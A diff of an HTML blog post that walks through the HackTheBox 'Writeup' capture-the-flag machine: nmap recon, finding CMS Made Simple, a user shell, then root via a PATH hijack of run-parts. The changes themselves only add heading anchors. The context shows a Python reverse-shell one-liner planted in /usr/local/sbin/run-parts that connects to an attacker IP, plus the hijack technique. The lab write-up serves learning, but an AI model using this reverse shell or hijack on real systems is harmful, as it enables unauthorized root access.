@@ -14,6 +14,8 @@ $ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-0
 <link rel="canonical" href="/posts/writeup/" />
 
 
+
+
 <link rel="stylesheet" href="/assets/style.css">
 
   <link rel="stylesheet" href="/assets/green.css">
@@ -158,10 +160,10 @@ $ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-0
   <img src="/img/writeup-hackthebox.png" class="post-cover" />
   
 
-  <div class="post-content">
-    <p>Writeup was my first machine I solved to start my CTF journey. It's an easy rated box but still interesting and perfect to jump into the CTF bath!</p>
-<h1 id="user-flag">User Flag</h1>
-<h2 id="recon">Recon</h2>
+  <div class="post-content"><div>
+        <p>Writeup was my first machine I solved to start my CTF journey. It's an easy rated box but still interesting and perfect to jump into the CTF bath!</p>
+<h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Let's start with the classic nmap:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC writeup.htb           
 Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-09-01 10:39 CEST
@@ -190,7 +192,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 <p>Each writeup is accessible throught the URL in the following form :</p>
 <pre><code>http://writeup.htb/writeup/index.php?page={writeup-name}
 </code></pre><p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible.</p>
-<h3 id="exploit">Exploit</h3>
+<h3 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">n</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">x</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
@@ -242,8 +244,8 @@ Last login: Sun Sep  <span style="color:#ae81ff">1</span> 05:07:51 <span style="
 jkr@writeup:~$ cat user.txt 
 d4e493fd40xxxxxxxxxxxxxx319f978
 jkr@writeup:~$ 
-</code></pre></div><h2 id="root-flag">Root Flag</h2>
-<h3 id="recon-1">Recon</h3>
+</code></pre></div><h2 id="root-flag">Root Flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="recon-1">Recon<a href="#recon-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>As a recon phase let's run <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># Attacker box</span>
 $ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
@@ -285,7 +287,7 @@ total <span style="color:#ae81ff">4</span>
 <li><code>/sbin/</code></li>
 </ul>
 <p>then it will be ran instead of the real <code>/bin/run-parts</code> and as root. If we have writting rights in any of those folder then it's bingo.</p>
-<h3 id="privilege-escalation">Privilege escalation</h3>
+<h3 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bash reserve shell doesn&#39;t work, let&#39;s use the python one</span>
 jkr@writeup:~$ cat /usr/local/sbin/run-parts 
 python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.85&#34;,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
@@ -307,7 +309,7 @@ eeba4xxxxxxxxxxxx8d7226
 <p>See you next time !</p>
 <p>-hg8</p>
 
-  </div>
+      </div></div>
   
   <div class="pagination">
     <div class="pagination__title">
